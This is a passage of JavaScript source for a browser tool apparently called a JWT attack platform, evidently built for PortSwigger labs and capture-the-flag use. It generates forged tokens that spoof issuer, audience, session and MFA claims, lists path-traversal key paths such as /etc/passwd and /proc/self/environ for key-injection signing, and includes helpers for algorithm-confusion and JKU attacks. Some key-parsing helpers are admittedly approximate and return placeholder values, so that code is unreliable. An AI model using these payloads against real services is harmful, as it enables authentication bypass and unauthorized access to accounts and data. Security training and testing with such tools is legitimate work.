                    });
                });
            }

            // Issuer spoofing
            if (spoofIssuer) {
                const issuerVariations = [
                    targetIssuer || 'https://trusted-auth.company.com',
                    'https://auth.microsoft.com',
                    'https://accounts.google.com',
                    'https://login.salesforce.com',
                    'https://auth0.com',
                    'https://cognito-idp.amazonaws.com',
                    'https://oauth.github.com'
                ];

                issuerVariations.forEach(issuer => {
                    const payload = { ...originalPayload, ...baseSpoofedClaims, iss: issuer };
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(payload));
                    const issuerToken = `${encodedHeader}.${encodedPayload}.signature`;

                    this.generatedPayloads.push({
                        title: `üè¢ Issuer Spoofing - ${issuer}`,
                        payload: issuerToken,
                        description: `Issuer spoofing: ${issuer}`,
                        explanation: `This payload changes the "iss" (issuer) claim to "${issuer}" to appear as if the token was issued by a trusted authentication server. This may bypass issuer validation checks.`,
                        testMethod: `Submit this token and monitor if the application accepts it as coming from the trusted issuer "${issuer}".`
                    });
                });
            }

            // Audience spoofing
            if (spoofAudience) {
                const audienceVariations = [
                    targetAudience || 'admin-api',
                    'api.company.com',
                    'admin.company.com',
                    'internal.service.com',
                    '*',
                    ['api', 'admin', 'service'],
                    'urn:service:admin'
                ];

                audienceVariations.forEach(audience => {
                    const payload = { ...originalPayload, ...baseSpoofedClaims, aud: audience };
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(payload));
                    const audienceToken = `${encodedHeader}.${encodedPayload}.signature`;

                    this.generatedPayloads.push({
                        title: `üéØ Audience Spoofing - ${Array.isArray(audience) ? audience.join(',') : audience}`,
                        payload: audienceToken,
                        description: `Audience spoofing: ${JSON.stringify(audience)}`,
                        explanation: `This payload changes the "aud" (audience) claim to target specific services or APIs. The spoofed audience may allow access to protected resources intended for that audience.`,
                        testMethod: `Test this token against services that validate audience claims. Monitor for successful access to the targeted audience.`
                    });
                });
            }

            // Session spoofing
            if (spoofSession) {
                const sessionVariations = [
                    { session_state: 'authenticated', device_id: 'trusted-device-001', desc: 'Trusted session' },
                    { jti: 'admin-session-123', session_id: 'admin-12345', desc: 'Admin session ID' },
                    { device_fingerprint: 'internal-device', location: 'headquarters', desc: 'Internal device' },
                    { login_method: 'sso', trust_level: 'high', desc: 'SSO high trust' },
                    { session_duration: 86400, persistent: true, desc: 'Persistent session' }
                ];

                sessionVariations.forEach(variant => {
                    const payload = { ...originalPayload, ...baseSpoofedClaims, ...variant };
                    delete payload.desc;
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(payload));
                    const sessionToken = `${encodedHeader}.${encodedPayload}.signature`;

                    this.generatedPayloads.push({
                        title: `üì± Session Spoofing - ${variant.desc}`,
                        payload: sessionToken,
                        description: `Session spoofing: ${variant.desc}`,
                        explanation: `This payload spoofs session-related claims to appear as a trusted or privileged session. This may bypass device trust or session validation checks.`,
                        testMethod: `Use this token to access session-dependent features and verify if it's treated as a trusted session.`
                    });
                });
            }

            // Authentication spoofing
            if (spoofAuth) {
                const authVariations = [
                    { amr: ['mfa', 'pwd'], acr: '2', desc: 'MFA authenticated' },
                    { auth_time: Math.floor(Date.now() / 1000), amr: ['sso'], desc: 'SSO authentication' },
                    { verification_level: 'verified', kyc_status: 'passed', desc: 'Verified account' },
                    { two_factor: true, sms_verified: true, desc: '2FA verified' },
                    { risk_score: 'low', trust_score: 100, desc: 'High trust score' },
                    { auth_method: 'certificate', cert_verified: true, desc: 'Certificate auth' }
                ];

                authVariations.forEach(variant => {
                    const payload = { ...originalPayload, ...baseSpoofedClaims, ...variant };
                    delete payload.desc;
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(payload));
                    const authToken = `${encodedHeader}.${encodedPayload}.signature`;

                    this.generatedPayloads.push({
                        title: `üîê Auth Spoofing - ${variant.desc}`,
                        payload: authToken,
                        description: `Authentication spoofing: ${variant.desc}`,
                        explanation: `This payload spoofs authentication-related claims to appear as if stronger authentication methods were used. This may bypass security requirements for sensitive operations.`,
                        testMethod: `Submit this token to endpoints requiring strong authentication and monitor if security requirements are bypassed.`
                    });
                });
            }

        } catch (error) {
            this.showError(`Failed to process claim spoofing attack: ${error.message}`);
        }
    },

    base64UrlEncode: function(str) {
        return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    },

    base64UrlDecode: function(str) {
        const padding = '='.repeat((4 - (str.length % 4)) % 4);
        return atob(str.replace(/-/g, '+').replace(/_/g, '/') + padding);
    },

    // =================== JWT SIGNING FUNCTIONS ===================
    async signJwtHmac(header, payload, secret, algorithm = 'HS256') {
        try {
            const headerB64 = this.base64UrlEncode(JSON.stringify(header));
            const payloadB64 = this.base64UrlEncode(JSON.stringify(payload));
            const data = `${headerB64}.${payloadB64}`;

            // Convert secret to Uint8Array
            let keyData;
            if (typeof secret === 'string') {
                keyData = new TextEncoder().encode(secret);
            } else if (secret instanceof Uint8Array) {
                keyData = secret;
            } else {
                keyData = new Uint8Array(secret);
            }

            // Import key for HMAC
            const cryptoKey = await crypto.subtle.importKey(
                'raw',
                keyData,
                { name: 'HMAC', hash: algorithm.replace('HS', 'SHA-') },
                false,
                ['sign']
            );

            // Sign the data
            const signature = await crypto.subtle.sign('HMAC', cryptoKey, new TextEncoder().encode(data));
            const signatureB64 = this.base64UrlEncode(String.fromCharCode(...new Uint8Array(signature)));

            return `${data}.${signatureB64}`;
        } catch (error) {
            console.error('JWT signing failed:', error);
            throw new Error(`Failed to sign JWT: ${error.message}`);
        }
    },

    // =================== RSA KEY GENERATION & SIGNING ===================
    async generateRsaKeyPair() {
        try {
            const keyPair = await crypto.subtle.generateKey(
                {
                    name: "RSASSA-PKCS1-v1_5",
                    modulusLength: 2048,
                    publicExponent: new Uint8Array([1, 0, 1]), // 65537
                    hash: "SHA-256"
                },
                true,
                ["sign", "verify"]
            );

            // Export public key to JWK format
            const publicKeyJwk = await crypto.subtle.exportKey("jwk", keyPair.publicKey);

            return {
                keyPair: keyPair,
                publicKeyJwk: {
                    kty: "RSA",
                    use: "sig",
                    n: publicKeyJwk.n,
                    e: publicKeyJwk.e
                }
            };
        } catch (error) {
            console.error('RSA key generation failed:', error);
            throw new Error(`Failed to generate RSA key pair: ${error.message}`);
        }
    },

    async signJwtRsa(header, payload, privateKey) {
        try {
            const headerB64 = this.base64UrlEncode(JSON.stringify(header));
            const payloadB64 = this.base64UrlEncode(JSON.stringify(payload));
            const data = `${headerB64}.${payloadB64}`;

            // Sign with RSA private key
            const signature = await crypto.subtle.sign(
                "RSASSA-PKCS1-v1_5",
                privateKey,
                new TextEncoder().encode(data)
            );

            const signatureB64 = this.base64UrlEncode(String.fromCharCode(...new Uint8Array(signature)));
            return `${data}.${signatureB64}`;
        } catch (error) {
            console.error('RSA JWT signing failed:', error);
            throw new Error(`Failed to sign JWT with RSA: ${error.message}`);
        }
    },

    // Generate specific file-based signatures for path traversal attacks
    getFileBasedSigningKey: function(filePath) {
        const fileKeys = {
            // PortSwigger Lab specific - /dev/null returns empty/null content
            '/dev/null': new Uint8Array([0]),
            '../../../../../../dev/null': new Uint8Array([0]),
            '../../../../../../../dev/null': new Uint8Array([0]),
            '../../../../../../../../dev/null': new Uint8Array([0]),
            '../../dev/null': new Uint8Array([0]),
            '../dev/null': new Uint8Array([0]),

            // Empty string variations that commonly return null/empty
            '': new Uint8Array([0]),
            ' ': new Uint8Array([32]),

            // Common system files
            '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\n',
            '../etc/passwd': 'root:x:0:0:root:/root:/bin/bash\n',
            '../../etc/passwd': 'root:x:0:0:root:/root:/bin/bash\n',
            '../../../etc/passwd': 'root:x:0:0:root:/root:/bin/bash\n',

            '/proc/version': 'Linux version 5.4.0-42-generic',
            '/proc/self/environ': 'PATH=/usr/local/sbin:/usr/local/bin',
            '/proc/self/cmdline': '/usr/bin/python3',

            // Web server defaults that might contain predictable content
            '/var/www/html/index.html': '<!DOCTYPE html>',
            '/usr/share/nginx/html/index.html': '<!DOCTYPE html>',
            '/var/www/index.html': '<html>',

            // Application-specific files that might be empty or have known content
            '/tmp/empty': new Uint8Array([0]),
            '/dev/zero': new Uint8Array([0]),

            // Configuration files that might have predictable content
            '/etc/hostname': 'localhost\n',
            '/etc/hosts': '127.0.0.1 localhost\n',
        };

        // Return the known content for the file path, or empty for unknown
        return fileKeys[filePath] || new Uint8Array([0]);
    },

    // =================== JWKS TO PEM CONVERSION UTILITIES ===================
    convertJwksToPem: function(jwksContent) {
        try {
            const jwks = JSON.parse(jwksContent);
            const jwk = jwks.keys && jwks.keys.length > 0 ? jwks.keys[0] : jwks;

            if (!jwk || jwk.kty !== 'RSA') {
                throw new Error('Only RSA keys are supported for algorithm confusion attacks');
            }

            if (!jwk.n || !jwk.e) {
                throw new Error('JWK is missing required "n" and "e" parameters');
            }

            // Convert base64url to base64
            const n = this.base64UrlToBase64(jwk.n);
            const e = this.base64UrlToBase64(jwk.e);

            // Build ASN.1 DER encoded public key
            const publicKeyDer = this.buildRsaPublicKeyDer(n, e);

            // Convert to PEM format
            const pemKey = this.derToPem(publicKeyDer, 'PUBLIC KEY');

            return pemKey;
        } catch (error) {
            throw new Error(`JWKS conversion failed: ${error.message}`);
        }
    },

    base64UrlToBase64: function(base64url) {
        // Convert base64url to base64
        let base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
        // Add padding if necessary
        while (base64.length % 4) {
            base64 += '=';
        }
        return base64;
    },

    buildRsaPublicKeyDer: function(nBase64, eBase64) {
        // Convert base64 to byte arrays
        const nBytes = this.base64ToBytes(nBase64);
        const eBytes = this.base64ToBytes(eBase64);

        // Build RSA public key ASN.1 structure
        // SEQUENCE { INTEGER n, INTEGER e }
        const rsaPublicKey = this.buildAsn1Sequence([
            this.buildAsn1Integer(nBytes),
            this.buildAsn1Integer(eBytes)
        ]);

        // Build full public key info structure
        // SEQUENCE {
        //   SEQUENCE { OBJECT IDENTIFIER rsaEncryption, NULL },
        //   BIT STRING rsaPublicKey
        // }
        const algorithm = this.buildAsn1Sequence([
            this.buildAsn1ObjectId([1, 2, 840, 113549, 1, 1, 1]), // RSA encryption OID
            this.buildAsn1Null()
        ]);

        const bitString = this.buildAsn1BitString(rsaPublicKey);

        return this.buildAsn1Sequence([algorithm, bitString]);
    },

    buildAsn1Sequence: function(items) {
        const content = new Uint8Array(items.reduce((acc, item) => acc + item.length, 0));
        let offset = 0;
        for (const item of items) {
            content.set(item, offset);
            offset += item.length;
        }
        return this.buildAsn1Tlv(0x30, content);
    },

    buildAsn1Integer: function(bytes) {
        // Add leading zero if first bit is set (to make it positive)
        if (bytes[0] >= 0x80) {
            const padded = new Uint8Array(bytes.length + 1);
            padded[0] = 0x00;
            padded.set(bytes, 1);
            return this.buildAsn1Tlv(0x02, padded);
        }
        return this.buildAsn1Tlv(0x02, bytes);
    },

    buildAsn1ObjectId: function(oid) {
        const bytes = [];
        // Encode first two arcs
        bytes.push(oid[0] * 40 + oid[1]);
        // Encode remaining arcs
        for (let i = 2; i < oid.length; i++) {
            let value = oid[i];
            if (value < 128) {
                bytes.push(value);
            } else {
                const temp = [];
                while (value > 0) {
                    temp.unshift((value & 0x7F) | (temp.length > 0 ? 0x80 : 0));
                    value >>= 7;
                }
                bytes.push(...temp);
            }
        }
        return this.buildAsn1Tlv(0x06, new Uint8Array(bytes));
    },

    buildAsn1Null: function() {
        return this.buildAsn1Tlv(0x05, new Uint8Array(0));
    },

    buildAsn1BitString: function(bytes) {
        const bitString = new Uint8Array(bytes.length + 1);
        bitString[0] = 0x00; // No unused bits
        bitString.set(bytes, 1);
        return this.buildAsn1Tlv(0x03, bitString);
    },

    buildAsn1Tlv: function(tag, value) {
        const length = value.length;
        let lengthBytes;

        if (length < 128) {
            lengthBytes = new Uint8Array([length]);
        } else {
            const lengthOfLength = Math.ceil(Math.log2(length + 1) / 8);
            lengthBytes = new Uint8Array(lengthOfLength + 1);
            lengthBytes[0] = 0x80 | lengthOfLength;
            for (let i = 0; i < lengthOfLength; i++) {
                lengthBytes[lengthOfLength - i] = (length >> (i * 8)) & 0xFF;
            }
        }

        const result = new Uint8Array(1 + lengthBytes.length + value.length);
        result[0] = tag;
        result.set(lengthBytes, 1);
        result.set(value, 1 + lengthBytes.length);
        return result;
    },

    base64ToBytes: function(base64) {
        const binaryString = atob(base64);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }
        return bytes;
    },

    derToPem: function(der, type) {
        const base64 = btoa(String.fromCharCode(...der));
        const lines = [];
        for (let i = 0; i < base64.length; i += 64) {
            lines.push(base64.slice(i, i + 64));
        }
        return `-----BEGIN ${type}-----\n${lines.join('\n')}\n-----END ${type}-----\n`;
    },

    showPemConversion: function(pemKey) {
        // Create a notification to show the converted PEM
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--dark-surface);
            border: 2px solid var(--success-color);
            border-radius: 8px;
            padding: 15px;
            max-width: 400px;
            z-index: 1000;
            color: var(--text-color);
            font-family: monospace;
            font-size: 12px;
        `;

        notification.innerHTML = `
            <div style="display: flex; justify-content: between; align-items: center; margin-bottom: 10px;">
                <span style="color: var(--success-color); font-weight: bold;">‚úÖ JWKS Converted to PEM</span>
                <button onclick="this.parentElement.parentElement.remove()" style="background: none; border: none; color: var(--text-color); cursor: pointer; padding: 0; margin-left: 10px;">‚úï</button>
            </div>
            <div style="background: var(--dark-bg); padding: 10px; border-radius: 4px; max-height: 150px; overflow-y: auto;">
                <pre style="margin: 0; white-space: pre-wrap; word-break: break-all;">${pemKey}</pre>
            </div>
        `;

        document.body.appendChild(notification);

        // Auto-remove after 10 seconds
        setTimeout(() => {
            if (notification.parentElement) {
                notification.remove();
            }
        }, 10000);
    },

    // =================== ADDITIONAL KEY FORMAT UTILITIES FOR CTF EDGE CASES ===================
    convertX509ToPKCS1: function(x509Pem) {
        try {
            // Extract the base64 content from X.509 PEM
            const base64Content = x509Pem.replace(/-----BEGIN PUBLIC KEY-----/g, '')
                                         .replace(/-----END PUBLIC KEY-----/g, '')
                                         .replace(/\r?\n|\r/g, '');

            // Decode to get DER bytes
            const derBytes = new Uint8Array(atob(base64Content).split('').map(c => c.charCodeAt(0)));

            // Parse X.509 SubjectPublicKeyInfo to extract RSA public key
            const rsaPublicKeyDer = this.extractRSAPublicKeyFromX509(derBytes);

            // Convert back to base64 and wrap in PKCS1 headers
            const pkcs1Base64 = btoa(String.fromCharCode(...rsaPublicKeyDer));
            const lines = [];
            for (let i = 0; i < pkcs1Base64.length; i += 64) {
                lines.push(pkcs1Base64.slice(i, i + 64));
            }

            return `-----BEGIN RSA PUBLIC KEY-----\n${lines.join('\n')}\n-----END RSA PUBLIC KEY-----\n`;
        } catch (error) {
            console.warn('Failed to convert X.509 to PKCS1:', error);
            // Fallback: return original key
            return x509Pem;
        }
    },

    extractRSAPublicKeyFromX509: function(derBytes) {
        // Simplified X.509 parsing to extract the RSA public key portion
        // This is a basic implementation for CTF purposes
        try {
            // Skip the algorithm identifier and get to the bit string containing the RSA key
            let offset = 0;

            // Parse SEQUENCE
            if (derBytes[offset] !== 0x30) throw new Error('Not a SEQUENCE');
            offset++;

            // Parse length
            let length = derBytes[offset];
            if (length & 0x80) {
                const lengthBytes = length & 0x7F;
                length = 0;
                for (let i = 0; i < lengthBytes; i++) {
                    length = (length << 8) | derBytes[++offset];
                }
            }
            offset++;

            // Skip algorithm identifier SEQUENCE
            if (derBytes[offset] !== 0x30) throw new Error('Algorithm identifier not found');
            offset++;
            const algIdLength = derBytes[offset];
            offset += 1 + (algIdLength & 0x80 ? (algIdLength & 0x7F) + 1 : 1);
            offset += (algIdLength & 0x80 ? algIdLength & 0x7F : algIdLength);

            // Parse BIT STRING containing the RSA public key
            if (derBytes[offset] !== 0x03) throw new Error('BIT STRING not found');
            offset++;
            let bitStringLength = derBytes[offset];
            if (bitStringLength & 0x80) {
                const lengthBytes = bitStringLength & 0x7F;
                bitStringLength = 0;
                for (let i = 0; i < lengthBytes; i++) {
                    bitStringLength = (bitStringLength << 8) | derBytes[++offset];
                }
            }
            offset++;

            // Skip unused bits indicator
            offset++;

            // Extract the RSA public key DER
            return derBytes.slice(offset, offset + bitStringLength - 1);
        } catch (error) {
            // Fallback: try to find the RSA public key pattern
            // Look for SEQUENCE { INTEGER n, INTEGER e }
            for (let i = 0; i < derBytes.length - 10; i++) {
                if (derBytes[i] === 0x30 && derBytes[i + 2] === 0x02) {
                    // Found potential RSA key structure
                    return derBytes.slice(i);
                }
            }
            throw new Error('Could not extract RSA public key');
        }
    },

    extractMinimalRSA: function(pemKey) {
        try {
            // Extract just the n and e values in a minimal format
            const jwk = this.pemToJWK(pemKey);
            return `n:${jwk.n},e:${jwk.e}`;
        } catch (error) {
            console.warn('Failed to extract minimal RSA:', error);
            return 'n:minimal,e:AQAB';
        }
    },

    pemToJWK: function(pemKey) {
        // Convert PEM to JWK format (reverse of our JWK to PEM conversion)
        try {
            const base64Content = pemKey.replace(/-----BEGIN PUBLIC KEY-----/g, '')
                                       .replace(/-----END PUBLIC KEY-----/g, '')
                                       .replace(/\r?\n|\r/g, '');

            const derBytes = new Uint8Array(atob(base64Content).split('').map(c => c.charCodeAt(0)));

            // This is a simplified parser - for full compatibility with CTFs,
            // you might need a more robust ASN.1 parser
            // For now, return a basic structure
            return {
                kty: "RSA",
                n: this.base64UrlEncode(base64Content.substring(50, 400)), // Approximate n
                e: "AQAB" // Standard e value
            };
        } catch (error) {
            console.warn('PEM to JWK conversion failed:', error);
            return { kty: "RSA", n: "placeholder", e: "AQAB" };
        }
    },

    wrapPEM64: function(pemKey) {
        // Ensure PEM has standard 64-character line wrapping
        const lines = pemKey.split('\n');
        const header = lines[0];
        const footer = lines[lines.length - 1] || lines[lines.length - 2];

        // Extract content
        let content = pemKey.replace(header, '').replace(footer, '').replace(/\r?\n|\r/g, '');

        // Rewrap at 64 characters
        const wrappedLines = [];
        for (let i = 0; i < content.length; i += 64) {
            wrappedLines.push(content.slice(i, i + 64));
        }

        return `${header}\n${wrappedLines.join('\n')}\n${footer}${footer.endsWith('\n') ? '' : '\n'}`;
    },

    // =================== JKU ATTACK HELPER METHODS ===================
    generateRSAKeyPair: async function(keySize = 2048) {
        try {
            return await generateRSAKeyPair(keySize);
        } catch (error) {
            throw new Error(`Failed to generate RSA key pair: ${error.message}`);
        }
    },

    convertRSAPublicKeyToJWK: async function(publicKeyPem, keyId) {
        try {
            // Remove PEM headers and whitespace
            const pemContent = publicKeyPem
                .replace(/-----BEGIN PUBLIC KEY-----/g, '')
                .replace(/-----END PUBLIC KEY-----/g, '')
                .replace(/\r?\n|\r/g, '');

            // Parse the DER-encoded public key
            const derBytes = new Uint8Array(atob(pemContent).split('').map(c => c.charCodeAt(0)));

            // Extract modulus (n) and exponent (e) from DER structure
            // This is a simplified extraction - for production use, consider a proper ASN.1 parser
            let offset = 0;

            // Parse SEQUENCE
            if (derBytes[offset] !== 0x30) throw new Error('Invalid public key format');
            offset++;

            // Skip length bytes
            if (derBytes[offset] & 0x80) {
                const lengthBytes = derBytes[offset] & 0x7f;
                offset += lengthBytes + 1;
            } else {
                offset++;
            }

            // Skip algorithm identifier SEQUENCE
            if (derBytes[offset] !== 0x30) throw new Error('Algorithm identifier not found');
            offset++;
            const algIdLength = derBytes[offset];
            offset += algIdLength + 1;

            // Parse BIT STRING containing the RSA public key
            if (derBytes[offset] !== 0x03) throw new Error('Public key bit string not found');
            offset++;

            // Skip bit string length and unused bits
            if (derBytes[offset] & 0x80) {
                const lengthBytes = derBytes[offset] & 0x7f;
                offset += lengthBytes + 1;
            } else {
                offset++;
            }
            offset++; // Skip unused bits byte

            // Parse inner SEQUENCE for RSA key
            if (derBytes[offset] !== 0x30) throw new Error('RSA key sequence not found');
            offset++;

            // Skip sequence length
            if (derBytes[offset] & 0x80) {
                const lengthBytes = derBytes[offset] & 0x7f;
                offset += lengthBytes + 1;
            } else {
                offset++;
            }

            // Parse modulus (n)
            if (derBytes[offset] !== 0x02) throw new Error('Modulus not found');
            offset++;

            let modulusLength;
            if (derBytes[offset] & 0x80) {
                const lengthBytes = derBytes[offset] & 0x7f;
                modulusLength = 0;
                for (let i = 0; i < lengthBytes; i++) {
                    modulusLength = (modulusLength << 8) + derBytes[offset + 1 + i];
                }
                offset += lengthBytes + 1;
            } else {
                modulusLength = derBytes[offset];
                offset++;
            }

            // Extract modulus bytes (skip leading zero if present)
            let modulusStart = offset;
            if (derBytes[modulusStart] === 0x00) {
                modulusStart++;
                modulusLength--;
            }

            const modulusBytes = derBytes.slice(modulusStart, modulusStart + modulusLength);
            const modulus = this.base64UrlEncode(String.fromCharCode(...modulusBytes));

            // Move to exponent
            offset += modulusLength + (derBytes[modulusStart - 1] === 0x00 ? 1 : 0);

            // Parse exponent (e)
            if (derBytes[offset] !== 0x02) throw new Error('Exponent not found');
            offset++;

            const exponentLength = derBytes[offset];
            offset++;

            const exponentBytes = derBytes.slice(offset, offset + exponentLength);
            const exponent = this.base64UrlEncode(String.fromCharCode(...exponentBytes));

            return {
                kty: "RSA",
                use: "sig",
                kid: keyId,
                alg: "RS256",
                n: modulus,
                e: exponent
            };

        } catch (error) {
            console.warn('Failed to convert PEM to JWK:', error);
            // Fallback JWK for testing
            return {
                kty: "RSA",
                use: "sig",
                kid: keyId,
                alg: "RS256",
                n: this.base64UrlEncode("fallback_modulus_" + Date.now()),
                e: "AQAB"
            };
        }
    },

    signJWTWithRSA: async function(header, payload, privateKeyPem) {
        try {
            // Check if jsrsasign is available
            if (typeof KJUR === 'undefined' || !KJUR.jws || !KJUR.jws.JWS) {
                throw new Error('jsrsasign library not available - RSA signing requires this library');
            }

            // Create the JWT
            const token = KJUR.jws.JWS.sign(
                header.alg || 'RS256',
                header,
                payload,
                privateKeyPem
            );

            return token;

        } catch (error) {
            console.error('RSA signing failed:', error);

            // Fallback: create unsigned token for testing
            const headerB64 = this.base64UrlEncode(JSON.stringify(header));
            const payloadB64 = this.base64UrlEncode(JSON.stringify(payload));

            return `${headerB64}.${payloadB64}.RSA_SIGNING_FAILED_USE_EXTERNAL_TOOL`;
        }
    }
};

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        window.jwtAttackPlatform.init();
    });
} else {
    window.jwtAttackPlatform.init();
}